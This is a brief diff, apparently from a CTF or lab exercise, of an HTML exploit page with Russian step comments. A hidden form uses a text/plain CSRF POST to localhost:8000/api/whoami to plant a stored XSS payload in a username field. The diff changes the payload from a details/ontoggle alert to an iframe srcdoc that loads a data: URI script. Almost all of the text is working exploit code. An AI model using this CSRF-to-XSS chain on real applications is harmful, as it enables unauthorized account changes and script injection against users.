@@ -11,7 +11,7 @@
   <!-- Шаг 3: POST /api/whoami -->
   <form id="f3" target="worker" action="http://localhost:8000/api/whoami"
         method="POST" enctype="text/plain">
-    <input name='{"new_username":"<</textarea><details open ontoggle' value='`alert(`XSS`)`>"}'>
+    <input name='{"new_username":"<</textarea><iframe srcdoc=`<script src' value='`data:text/javascript,alert(XSS)`></script>`></iframe>"}'>
   </form>
 
   <!-- Шаг 4: GET /#/settings -->
@@ -32,5 +32,3 @@
 
 </body>
 </html>
-  
-  
